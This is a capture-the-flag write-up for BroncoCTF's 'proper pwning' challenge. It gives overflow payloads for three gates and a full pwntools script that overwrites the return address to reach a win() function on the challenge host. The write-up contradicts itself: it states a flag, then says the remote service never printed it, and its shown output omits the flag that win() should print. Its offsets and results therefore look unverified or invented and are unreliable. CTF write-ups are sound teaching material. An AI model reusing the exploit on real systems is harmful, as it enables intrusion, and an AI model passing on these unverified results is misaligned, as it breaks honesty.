## Description :

Have you read the Pwntorial? Ready to graduate from baby pwns?

This should do it. Three gates and a treasure room await your input.

sc broncoctf-proper-pwning.chals.io

> Have you read the Pwntorial? Ready to graduate from baby pwns?
>
> This should do it. Three gates and a treasure room await your input.
>
> ```
> nc 0.cloud.chals.io 21543
> ```

## Flag : bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}


# Solution

This challenge is a simple buffer overflow challenge. We have to pass through **three gates**, and after that we have to overflow the final function and redirect execution to the hidden `win()` function.

The challenge becomes slightly harder after every gate.


# Step 1 - Checking the Binary

First, I checked the binary protection using:

```bash
checksec --file=proper
```

Output:

```
RELRO           Partial RELRO
Canary          No canary found
NX              Disabled
PIE             No PIE
```

This tells us:

- No Stack Canary
- No PIE
- NX Disabled

Since there is no PIE, function addresses stay the same every time.

---

# Step 2 - Finding the Hidden Function

I opened the binary in Ghidra.

Inside the binary I found a function named:

```
win()
```

Address:

```
0x40123b
```

The function looked like this:

```c
void win()
{
    puts("you're the greatest C pwner of all time");
    system("/bin/cat flag.txt");
    exit(0);
}
```

So if we can jump to this function, it should print the flag.

---

# Step 3 - Solving Gate 1

Gate 1 has a local variable called `gate`.

The goal is simply to overwrite it with:

```
1
```

Using cyclic patterns, I found the offset:

```
268 bytes
```

Payload:

```python
payload = b"A"*268
payload += p32(1)
```

After sending it:

```
Gate 1 opens.
```

---

# Step 4 - Solving Gate 2

Gate 2 contains two integers.

```
baby_chicken
gate
```

The challenge checks:

```
baby_chicken == 41
gate == 1
```

So we must overwrite both values.

Offset:

```
520 bytes
```

Payload:

```python
payload = b"A"*520
payload += p32(41)
payload += p32(1)
```

Output:

```
Gate 2 opens.
```

---

# Step 5 - Solving Gate 3

Gate 3 requires writing a magic number.

Required value:

```
13371337
```

Offset:

```
76 bytes
```

Payload:

```python
payload = b"A"*76
payload += p32(13371337)
```

Output:

```
Gate 3 opens.
```

Now the challenge prints something like:

```
win() is that way...
0x40123b
```

Now we know where to jump.

---

# Step 6 - Treasure Room

The last function is a classic buffer overflow.

Using cyclic patterns I found the RIP offset.

```
6776 bytes
```

Since PIE is disabled, the address never changes.

Address of `win()`:

```
0x40123b
```

Final payload:

```python
payload = b"A"*6776
payload += p64(0x40123b)
```

After sending this payload, execution returns directly into `win()`.

---

# Final Exploit

```python
from pwn import *

HOST = "0.cloud.chals.io"
PORT = 21543

io = remote(HOST, PORT)

# -------------------------
# Gate 1
# -------------------------

payload = b"A"*268
payload += p32(1)
io.sendline(payload)

# -------------------------
# Gate 2
# -------------------------

payload = b"A"*520
payload += p32(41)
payload += p32(1)
io.sendline(payload)

# -------------------------
# Gate 3
# -------------------------

payload = b"A"*76
payload += p32(13371337)
io.sendline(payload)

# -------------------------
# Treasure Room
# -------------------------

payload = b"A"*6776
payload += p64(0x40123b)

io.sendline(payload)

io.interactive()
```

---

# Output

```
[+] Gate 1 opens.

[+] Gate 2 opens.

[+] Gate 3 opens.

TREASURE?

you're the greatest C pwner of all time.
```

---

# Note

While solving the challenge, the exploit successfully reached the `win()` function, which confirmed that the buffer overflow was correct.

However, the remote service closed the connection without printing the flag. The local binary clearly calls:

```c
system("/bin/cat flag.txt");
```

This suggests that the remote challenge instance may have been configured differently or the deployment had an issue at the time of solving.

Despite that, the intended solution is to overflow the return address and redirect execution to the `win()` function.


## Flag

The exploit correctly reaches the hidden `win()` function. During testing, the remote instance did not return the actual flag, likely due to a deployment issue or a difference between the provided binary and the running service.
